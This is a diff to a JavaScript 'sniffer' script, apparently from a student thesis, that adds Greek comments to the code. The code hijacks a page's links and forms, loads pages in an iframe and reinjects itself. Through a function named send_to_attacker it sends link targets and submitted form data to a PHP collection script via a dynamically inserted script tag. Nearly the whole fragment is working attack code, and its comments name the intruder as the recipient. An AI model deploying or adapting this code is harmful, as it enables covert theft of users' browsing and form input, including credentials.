@@ -4,12 +4,12 @@ var doc = document;
 
 function load_sniffer()
 {
-  create_object();
-  collect_links();
-  collect_forms();
+  create_object(); //εκκίνηση του προγράμματος sniffer
+  collect_links(); //φόρτωση όλων των συνδέσμων ιστοσελίδας
+  collect_forms(); //φόρτωση όλων των φορμών ιστοσελίδας
 }
 
-function create_object()    {
+function create_object()    { //Δημιουργία XMLHTTP object για χρήση ajax
 
     if(window.ActiveXObject)     {
         //IE
@@ -37,7 +37,7 @@ function create_object()    {
 
 }
 
-function loadUrl(link)
+function loadUrl(link) 	//Δημιουργεί ένα νέο παράθυρο (iframe) με τον link που έδωσε ο χρήστης
 {
 	send_to_attacker(link);
 
@@ -58,7 +58,7 @@ function loadUrl(link)
 
 		document.body.appendChild(ifrm);
 
-		setTimeout(function() {
+		setTimeout(function() { 	// ανανέωση παραθύρου μετά από 4 δευτερόλεπτα
 			var sc = doc.defaultView.document.createElement("script");
 			sc.type="text/javascript";
 			sc.src = "sniffer.js";
@@ -75,7 +75,7 @@ function loadUrl(link)
 	}
 }
 
-function collect_links()
+function collect_links() //φόρτωση όλων των συνδέσμων ιστοσελίδας και αλλαγή των targetAddresses με javascript calls
 {
 	var all_links = doc.defaultView.document.getElementsByTagName("a");
     var total_links = all_links.length;
@@ -84,7 +84,8 @@ function collect_links()
     }
 }
 
-function collect_forms()
+function collect_forms()  	//φόρτωση όλων των φορμών και αλλαγή τους σε javascript calls
+
 {
     var all_forms = doc.defaultView.document.getElementsByTagName("form");
     var total_forms = all_forms.length;
@@ -115,9 +116,9 @@ function submit_form(form_id)
   send_to_attacker(attack_string);
 }
 
-function send_to_attacker(param_url)
+function send_to_attacker(param_url) //Αποστολή δεδομένων συνδέσμων και δεδομένων από φόρμες στοιχείων στο εισβολέα
 {
-	var attack_script = "http://localhost/thesis/spying_on_data.php?data=" + escape(param_url); 
+	var attack_script = "http://localhost/thesis/spying_on_data.php?data=" + escape(param_url);
 
     var script = document.createElement('script');
     script.src = attack_script;
